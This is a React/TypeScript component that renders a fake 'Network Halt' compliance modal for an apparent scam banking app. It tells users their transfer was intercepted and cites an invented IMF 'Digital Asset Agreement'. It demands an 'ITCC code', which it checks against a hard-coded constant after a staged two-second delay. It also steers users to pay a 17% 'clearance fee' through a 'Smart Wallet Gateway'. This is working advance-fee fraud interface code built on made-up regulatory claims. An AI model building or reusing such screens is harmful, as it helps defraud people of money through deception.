
import React, { useState } from 'react';
import { SpinnerIcon, ShieldCheckIcon, ScaleIcon, XIcon } from './Icons.tsx';
import { CLEARANCE_CODE } from '../constants.ts';
import { SmartWalletPayment } from './SmartWalletPayment.tsx';

interface ComplianceHaltModalProps {
    isOpen: boolean;
    amount: number;
    onVerified: () => void;
    onCancel: () => void;
}

export const ComplianceHaltModal: React.FC<ComplianceHaltModalProps> = ({ isOpen, amount, onVerified, onCancel }) => {
    const [code, setCode] = useState('');
    const [error, setError] = useState('');
    const [view, setView] = useState<'input' | 'smart_wallet'>('input');
    const [isChecking, setIsChecking] = useState(false);

    const clearanceFee = amount * 0.17; // 17% clearance fee

    if (!isOpen) return null;

    const handleVerify = () => {
        setError('');
        setIsChecking(true);
        setTimeout(() => {
            if (code.toUpperCase() === CLEARANCE_CODE) {
                onVerified();
            } else {
                setError('Invalid ITCC Code. Network transfer remains paused.');
                setIsChecking(false);
            }
        }, 2000);
    };

    const handlePaymentSuccess = () => {
        // Return to input view so user can manually enter the code
        setView('input');
    };

    return (
        <div className="fixed inset-0 bg-slate-950/90 backdrop-blur-xl z-[100] flex items-center justify-center p-4 animate-fade-in">
            {view === 'input' ? (
                <div className="w-full max-w-lg bg-slate-900 border border-red-500/50 rounded-2xl shadow-2xl overflow-hidden relative animate-fade-in-up ring-1 ring-red-900/50">
                    {/* Restriction Banner */}
                    <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-red-600 via-red-500 to-red-600 animate-pulse"></div>
                    
                    <div className="p-8 text-center">
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6 ring-1 ring-red-500/30 shadow-[0_0_40px_rgba(239,68,68,0.2)]">
                            <ScaleIcon className="w-12 h-12 text-red-500" />
                        </div>
                        
                        <h2 className="text-3xl font-black text-white uppercase tracking-tight">Network Halt</h2>
                        <div className="flex items-center justify-center gap-2 mt-2">
                            <span className="relative flex h-2.5 w-2.5">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                            </span>
                            <p className="text-red-400 font-bold text-xs uppercase tracking-widest">Compliance Action Required</p>
                        </div>
                        
                        <div className="mt-8 text-left bg-red-950/30 border border-red-900/50 p-5 rounded-xl">
                            <p className="text-slate-300 text-sm leading-relaxed font-mono mb-4">
                                <span className="text-red-400 font-bold">>> SYSTEM_ALERT:</span> Transaction intercepted by Global Interbank Monitoring System (GIMS).<br/><br/>
                                Authorization is pending valid <strong className="text-white">ITCC Compliance Code</strong>. Funds cannot be released to the settlement network until this restriction is lifted.
                            </p>
                            <div className="pt-4 border-t border-red-900/30">
                                <p className="text-xs text-slate-400 leading-relaxed">
                                    <strong className="text-red-300">IMF AUTHORIZATION NOTICE:</strong> Per Article IV of the International Monetary Fund Digital Asset Agreement, a mandatory <strong className="text-white">17% liquidity deduction</strong> applies to all flagged transactions (Local & International) cleared via the <strong className="text-white">Smart Wallet Gateway</strong>. This ensures modern banking compliance, customer trust, and the integrity of the digital ledger.
                                </p>
                            </div>
                        </div>

                        <div className="mt-8">
                            <label className="block text-left text-xs font-bold text-slate-500 uppercase mb-2 pl-1">Input ITCC Code</label>
                            <input 
                                type="text" 
                                value={code}
                                onChange={(e) => setCode(e.target.value.toUpperCase())}
                                className="w-full bg-black border border-slate-700 text-center text-3xl tracking-[0.25em] font-mono text-white py-4 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent outline-none transition-all shadow-inner placeholder-slate-800"
                                placeholder="IMF-..."
                                autoFocus
                            />
                            {error && (
                                <div className="mt-3 flex items-center justify-center gap-2 text-red-400 bg-red-950/50 py-2 rounded-lg border border-red-900/50">
                                    <XIcon className="w-4 h-4" />
                                    <span className="text-xs font-bold uppercase">{error}</span>
                                </div>
                            )}
                        </div>

                        <button 
                            onClick={handleVerify}
                            disabled={isChecking || code.length < 3}
                            className="w-full mt-6 py-4 bg-slate-100 hover:bg-white text-slate-900 font-bold rounded-xl shadow-lg flex items-center justify-center gap-3 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            {isChecking ? <SpinnerIcon className="w-5 h-5 text-slate-900"/> : <ShieldCheckIcon className="w-5 h-5"/>}
                            {isChecking ? 'Verifying with IMF Database...' : 'Verify & Release Funds'}
                        </button>

                        <div className="mt-8 pt-6 border-t border-slate-800">
                            <div className="flex flex-col gap-3">
                                <p className="text-xs text-slate-500">
                                    Missing your code? The clearance fee must be settled via the Smart Wallet Gateway to generate a new ITCC.
                                </p>
                                <button 
                                    onClick={() => setView('smart_wallet')}
                                    className="text-sm font-bold text-red-400 hover:text-red-300 underline underline-offset-4 transition-colors"
                                >
                                    Pay Clearance Fee via Smart Wallet
                                </button>
                            </div>
                        </div>
                    </div>
                    <button onClick={onCancel} className="absolute top-4 right-4 text-slate-600 hover:text-white transition-colors">
                        <XIcon className="w-6 h-6" />
                    </button>
                </div>
            ) : (
                <div className="w-full max-w-md">
                    <SmartWalletPayment 
                        amount={clearanceFee}
                        onPaymentConfirmed={handlePaymentSuccess}
                        onBack={() => setView('input')}
                    />
                </div>
            )}
        </div>
    );
};
